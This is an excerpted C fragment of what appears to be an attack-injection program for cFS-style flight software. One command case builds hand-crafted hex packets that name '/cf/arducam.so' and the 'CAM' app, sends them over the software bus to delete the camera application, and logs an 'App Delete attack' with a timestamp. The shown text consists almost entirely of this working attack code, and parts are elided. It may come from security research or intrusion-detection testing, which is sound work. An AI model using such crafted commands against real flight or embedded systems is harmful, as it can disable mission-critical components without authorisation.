    ...
    */
    ...
    switch (CommandCode)
    {
        ...
        */
        case CAM_EXP3_CC:
            ;
            //APP DELETE (CAM) - TAGGED ON 8th Byte (CHECKSUM) with 35 (A25)
            uint8_t buffer[] = {0x18,0x8c,0xc0,0x00,0x00,0x41,0x05,0x23,0x2f,0x63,0x66,0x2f,0x61,0x72,0x64,0x75,0x63,0x61,0x6d,0x2e,0x73,0x6f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; 
            uint8_t buffer2[] = {0x18,0x06,0xc0,0x00,0x00,0x15,0x05,0x23,0x43,0x41,0x4d,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            ...
            sleep(0.1);
            CFE_SB_TransmitMsg((CFE_MSG_Message_t *) buffer2, true);
            
            printf("Executed App Deletion on CAM\n");
            //fprintf(attack_log, "App Delete attack at : %lld \n", localtime.ticks);
            fprintf(attack_log, "App Delete attack at : %d.%06ld \n", packet_seconds, realtime.tv_nsec/1000);
            fflush(attack_log);
